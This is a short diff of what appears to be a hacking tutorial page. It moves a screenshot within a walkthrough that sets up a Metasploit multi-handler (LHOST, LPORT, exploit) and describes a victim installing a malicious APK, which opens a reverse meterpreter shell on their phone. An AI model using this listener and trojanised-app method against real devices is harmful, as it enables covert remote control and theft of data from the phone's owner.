@@ -185,13 +185,12 @@ set LHOST 172.17.0.2
 set LPORT 8888
 exploit
 ```
+<img class="img_big" src="/hacking/docker_sploit/step_4_2_multi_handler.png" alt="step_4_2_multi_handler">
 
 
 ### Step 4.3 : Execute the payload, enjoy the meterpreter
 
 Our target will somehow install the apk on his / her phone, and then... KABOOM! \
-
-<img class="img_big" src="/hacking/docker_sploit/step_4_2_multi_handler.png" alt="step_4_2_multi_handler">
 
 The app is installed and started, we receive our reverse meterpreter and can now have fun with it! \
 Small demo here, getting system info, sending a message to myself and popping a shell :)
